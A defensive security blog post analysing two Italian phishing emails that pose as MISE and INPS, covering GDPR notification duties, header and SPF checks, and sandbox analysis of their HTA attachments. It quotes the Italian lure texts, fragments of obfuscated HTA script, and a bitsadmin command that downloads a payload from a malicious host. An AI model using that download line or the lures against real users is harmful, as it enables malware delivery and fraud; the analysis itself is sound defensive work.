---
cover: ad
date: 2022-03-25
tags:
- blog
- digital-self-defence
- intermediate
- phishing
- security
---
These days I am receiving more requests for help than ever. Most of them concern suspicious emails, maybe because people are more aware, maybe because the current geopolitical situation is evolving fast.

I want to present a couple of cases I received recently, to help:

* IT managers set up a proper notification and response process.
* End users evaluate suspicious emails.

## GDPR Recap

European firms should already have a data breach notification process defined and communicated to employees. Just in case, let's review the relevant GDPR articles:

* **Art. 4.12 - Definitions:** personal data breach means a breach of security leading to the **accidental or unlawful destruction, loss, alteration, unauthorised disclosure of, or access to, personal data transmitted, stored or otherwise processed**.
* **Art. 33.1 - Notification of a personal data breach to the supervisory authority:** in the case of a personal data breach, the controller shall, without undue delay and, where feasible, **not later than 72 hours after having become aware of it, notify the personal data breach to the supervisory authority competent in accordance with Article 55, unless the personal data breach is unlikely to result in a risk to the rights and freedoms of natural persons**. Where the notification to the supervisory authority is not made within 72 hours, it shall be accompanied by reasons for the delay.
* **Art. 33.5 - Notification of a personal data breach to the supervisory authority:** the controller **shall document any personal data breaches, comprising the facts relating to the personal data breach, its effects and the remedial action taken**. That documentation shall enable the supervisory authority to verify compliance with this Article.

In practice, firms must have procedures to:

* Communicate data breaches within the firm (notification).
* Evaluate the risk associated with data breaches (response).
* Register data breaches and the related analysis (tracking).

Given the GDPR definition of a data breach, most security incidents are data breaches. Following ITIL, an incident is:

> ITIL defines an incident as an unplanned interruption to or quality reduction of an IT service.

An unplanned event will affect personal data one way or another, so any incident affecting personal data is a data breach. We can therefore have a single set of procedures that describe the incident management process.

## Notification

We will discuss incident management procedures in a later article. For now, just make sure a notification process is in place inside the organization. For this post, the notification is the request of a user about a suspicious email. Users are required to forward any suspicious email as an attachment, or to use any integration that does the same automatically.

I also use the same procedure to evaluate how many users detect phishing emails and alert the SOC.

## Email Analysis

In most cases, I receive an email in `msg` format (from Microsoft Outlook). I convert it into `eml` format with:

```bash
msgconvert *.msg
```

Below you can see the headers and bodies of both emails. From a user perspective:

* The emails are written in correct Italian.
* There is no valid reason why a government department would write via standard email (in Italy we have a special email system called PEC).
* Both emails are unsolicited.
* Both emails have image trackers.
* Both emails have attachments (ZIP files).

Because the emails are unsolicited and carry ZIP attachments, users should report them to the internal department for further analysis. To be honest, I would not blame users who click on them, because they are very well formatted.

The questions we need to answer are:

* Are the emails malicious?
* Why were the emails delivered to users instead of being filtered by the anti-spam?
* Did anyone open and execute the attachments?

### Case 1: Email Headers and Body

```text
Date: Tue, 8 Mar 2022 12:06:44 +0000
Subject: Circolare  07.03.2022  , comunicazione  aiuti per le  societa
From: mise.gov.it <ufficio@mise.gov.it>
To: <mario.rossi@example.com>
Received: from plexkck-1.localdomain ([5.135.192.105]) by
 antispam.example.com with ESMTP id nCz5MOHOACUQg9dv (version=TLSv1.2
 cipher=ECDHE-RSA-AES128-GCM-SHA256 bits=128 verify=NO) for
 <mario.rossi@example.com>; Tue, 08 Mar 2022 13:06:45 +0100 (CET)
Received: by plexkck-1.localdomain (Postfix, from userid 10004) id
 90A8BA190C; Tue,  8 Mar 2022 12:06:44 +0000 (UTC)
Reply-To: <ufficio@mise.gov.it>
X-Virus-Scanned: by bsmtpd at example.com
Return-Path: iptvtc@iptvtc.com
```

```text
  <https://i.ibb.co/nmbxdJ7/external-content-duckduckgo-com.jpg>

Il Ministero dello Sviluppo Economico, dipartimento per lo sviluppo dell'economi
a,
sezione per la promozione delle attivita imprenditoriali, Dispone:
La presente circolare fornisce chiarimenti in merito alla tipologia, alle condizioni,
ai limiti, alla durata e alle modalita di fruizione delle
agevolazioni fiscali e contributive previste per il pacchetto di aiuti alle ditte ,
al fine di portare a conoscenza dei soggetti interessati, anteriormente.
In allegato l'archivio recante i dettagli riguardanti le singole tipologie di attivita e l'elenco delle varie modalita di fruizione.

Via Giorgione, 2b - 00147 Roma
mise.gov.it
```

### Case 2: Email Headers and Body

```text
Date: Wed, 23 Feb 2022 06:46:54 +0100
Subject: notifica al contribuente per documentazione mancante
From: Vincenzo Damato <vincenzo.damato@inps.it>
To: <privacy@example.com>
Received: from h2677552.stratoserver.net (advancedesign.de [85.214.135.204])
 by antispam.example.com with ESMTP id aN9SvNX5AeAZooYL (version=TLSv1.2
 cipher=ECDHE-RSA-AES128-GCM-SHA256 bits=128 verify=NO) for
 <privacy@example.com>; Wed, 23 Feb 2022 06:46:55 +0100 (CET)
Received: by h2677552.stratoserver.net (Postfix, from userid 10001) id
 843862561C61; Wed, 23 Feb 2022 06:46:54 +0100 (CET)
Reply-To: <vincenzo.damato@inps.it>
X-Virus-Scanned: by bsmtpd at example.com
```

```text
  <https://i.ibb.co/51VfRPp/INPS.jpg>

Gentile contribuente,
Le notifichiamo che non è stata accolta la domanda in oggetto , corrisposta il 14.01.2021 , per il seguente motivo :
Lei non ha fornito la documentazione che è stata richiesta il 04/01/2021 e, di conseguenza, non è stato possibile proseguire all'accertamento del diritto alla prestazione.
La informiamo oltre a tutto che, nel caso in cui volesse contrastare il presente provvedimento, potrà presentare un reclamo amministrativo solamente on line tramite l'apposita sezione sul portale INPS.
L'eventuale azione giudiziaria contro il presente provvedimento dovrà essere notificata presso questa agenzia, avendo il rappresentante legale dell'istituto eletto a tal fine domicilio speciale presso l'agenzia stessa, ai sensi dell'art. 48 del codice penale e per gli effetti di cui all'art. 30 del codice di procedura civile .
La preghiamo di prendere visione della documentazione esaustiva riguardante la sua richiesta e il provvedimento, entrambi presenti nell'archivio allegato e scaricabile nella presente e-mail. L'ufficio è a sua completa disposizione per ogni informazione o chiarimento.

Il responsabile di unità operativa
Vincenzo Damato
```

## SPF Analysis

The first question that came to my mind was about the anti-spam: is it working fine?

The basic check evaluates the SPF record and finds out whether the source IP addresses were allowed to send those emails. Let's get the SPF records:

```bash
dig -t txt mise.gov.it +noall +answer
dig -t txt inps.it +noall +answer
```

### MISE SPF Record Analysis

The SPF record for MISE is:

```text
v=spf1 ip4:85.20.209.229 ip4:85.20.209.232 ip4:212.17.196.121 ip4:89.119.244.34 ip4:89.119.244.35 ip4:89.119.244.88 ip4:85.20.124.52 ip4:89.119.244.44 include:esg01.mise.gov.it include:esg02.mise.gov.it include:esg03.mise.gov.it -all
```

The source IP address of the MISE email is `5.135.192.105`. It is assigned to a German company, it appears in some [RBL lists](https://talosintelligence.com/reputation_center/lookup?search=5.135.192.105) and it is [not included in the SPF record](https://mxtoolbox.com/SuperTool.aspx?action=spf%3ainps.it%3a85.214.135.204&run=toolpage).

The anti-spam should have filtered it, so it is misconfigured.

### INPS SPF Record Analysis

```text
v=spf1 ip4:89.97.177.19 ip4:89.97.177.3 ip4:93.63.43.112 ip4:93.63.43.115 ip4:93.63.43.113 ip4:93.63.43.114 ~all
```

The source IP address of the INPS email is `85.214.135.204`. It is assigned to a German company, it does not appear in the [RBL lists](https://talosintelligence.com/reputation_center/lookup?search=5.135.192.105) and it is definitely [not included in the SPF record](https://mxtoolbox.com/SuperTool.aspx?action=spf%3ainps.it%3a85.214.135.204&run=toolpage).

The anti-spam should have filtered it or added a `SPAM` tag, so it is misconfigured.

## Attachment Analysis

Both emails contain a ZIP file. To extract the attachments from the `eml` files, I use:

```bash
munpack *.eml
```

Both emails contain a compressed `hta` file. HTA stands for HTML Application: an executable HTML page that contains script code (**what a great idea!**). The file is executed by `mshta.exe`, which is available by default.

We use [VirusTotal](https://virustotal.com/ "VirusTotal") and [Any.Run](https://any.run/ "Any.Run") to analyze the files. Remember: do not upload confidential files to those portals, because they are shared with subscribers.

### MISE Attachment Analysis

The MISE HTA file is obfuscated and appears to be encrypted:

```text
<META NAME='GENERATOR' Content='The source code of this page is encrypted with HTML Guardian,  the world's standart for website protection. Visit http://www.protware.com for details'><meta http-equiv='expires' content=''>
<script>l1l=document.documentMode||document.all;var ca8b5d6e=true;ll1=document.layers;lll=window.sidebar;ca8b5d6e=(!(l1l&&ll1)&&!(!l1l&&!ll1&&!lll));l_ll=location+'';l11=navigator.userAgent.toLowerCase();function lI1(l1I){return l11.indexOf(l1I)>0?true:false};lII=lI1('kht')|lI1('per');ca8b5d6e|=lII;zLP=location.protocol+'0FD';qxPX21ALo321P='vrexI';</script>
<script>...</script>
```

Few anti-malware engines report it as malware, according to the [VirusTotal report](https://www.virustotal.com/gui/file-analysis/NzU4NDFhZjZmZjc1Njg5ZTYyZDgxZDdmMjE2N2YzMzE6MTY0ODEzODg4Mw== "VirusTotal report"). The initial report is from `2022-03-24 16:21:23 UTC` and was submitted by me. It will probably change in the future.

If we execute the file in Any.Run, we see that it downloads a file with `BITSADMIN.EXE`:

```text
"C:\Windows\System32\bitsadmin.exe" /transfer 8 http://ecologilink.top/notepad.txt C:\Users\admin\AppData\Local\Temp\online.exe
```

The malicious server is no longer available, so the malware, even if executed, is harmless. We should now check who downloaded `http://ecologilink.top/notepad.txt` and review the anti-malware logs.

You can see the [full Any.Run report](https://any.run/report/69dba283d546ac64008f8d9a85e33cf64ffcdc79e2498c8214019900da3d3bec/b47f687e-e6bb-49c2-adc2-3b92a5a4d4ba "Any.Run report") and look at the malware behavior.

![[case-1-attack-matrix.png]]

### INPS Attachment Analysis

The INPS HTA file is obfuscated:

```html
<script language="vbscript">
execute("XRQyEEDmMAdVnEQgHZjytwdffVifYTQiMDH = array(192, 224, 117, 214, 188, 201, ...
</script>
```

Few anti-malware engines report it as malware, according to the [VirusTotal report](https://www.virustotal.com/gui/file/88431a0d14112c4019da607c75af245b1c370fc59290fa8bfe28e924bfbce411). The initial report is from `2022-02-23 08:51:27 UTC` and was submitted by me. It will probably change in the future.

If we execute the file in Any.Run, we see that it triggers the download of some files from Windows Update and DigiCert. Both sites are legitimate, but I guess the malware detected the Any.Run sandbox and stopped the execution.

According to the [full Any.Run report](https://any.run/report/88431a0d14112c4019da607c75af245b1c370fc59290fa8bfe28e924bfbce411/83f82790-7c1e-49c3-96f8-f87ca6d83d28 "Any.Run report"), the malware accessed a lot of Windows Registry keys and, in particular, gathered information about NTP and localization. We can assume that the malware stopped because it recognized the sandbox.

![[case-2-attack-matrix.png]]

## Conclusions and Suggested Best Practices

Besides the malware analysis approach I used, we realized that organizations should have a procedure in place to notify events and anomalies. They should also deliver specific training to end users, covering:

* Basic email analysis to identify spam and malware emails.
* How to request help and report those emails.
* The responsibility of users regarding malware notification, especially if they clicked on the malicious attachment (be inclusive, avoid punishment).

From a technical perspective, we should:

* Fix and verify the anti-spam configuration (possibly filtering out some attachment file types).
* Deny URLs included in malicious categories.
* Deny URLs not yet categorized (new domains).
* Implement SSL inspection for outgoing web traffic (excluding sensitive websites such as banking, and updating the internal policy).
* Implement a logging platform and include it in the incident management process.
